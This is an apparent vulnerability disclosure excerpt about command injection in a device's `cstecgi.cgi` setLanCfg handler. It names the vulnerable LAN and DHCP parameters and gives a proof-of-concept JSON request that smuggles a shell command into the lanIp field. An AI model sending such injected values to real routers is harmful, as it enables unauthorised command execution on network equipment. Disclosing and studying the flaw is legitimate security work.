...
The vulnerability is located in the function `sub_427E64` within `cstecgi.cgi`, also known as `setLanCfg`.

![](Pasted%20image%2020231129161643.png)
![](Pasted%20image%2020231129161717.png)
...
therefore , by controlling parameter among  `lanIp,lanNetmask,dhcpStart,dhcpEnd,dhcpLease` , we can finally make an arbitrary command execution
...
{"lanIp":"`id > /1.txt;`","topicurl":"setLanCfg","token":"00000000000000000000000000000000"}
~~~
...
![](Pasted%20image%2020231129162422.png)